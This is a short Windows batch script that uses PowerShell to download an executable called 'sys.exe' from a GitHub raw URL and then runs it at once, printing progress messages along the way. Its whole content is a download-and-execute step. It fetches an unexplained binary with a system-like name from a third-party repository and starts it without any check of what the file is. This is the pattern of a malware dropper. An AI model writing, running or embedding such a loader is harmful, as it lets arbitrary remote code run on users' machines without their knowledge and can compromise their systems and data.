:: Download the file from the given URL
echo Downloading sys.exe...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Furystorage/final/raw/main/sys.exe' -OutFile 'sys.exe'"

:: Check if the download was successful
if exist sys.exe (
    echo Download complete. Running sys.exe...
    start sys.exe
) else (
    echo Download failed. Please check the URL or your internet connection.
)

:: End of the script
exit
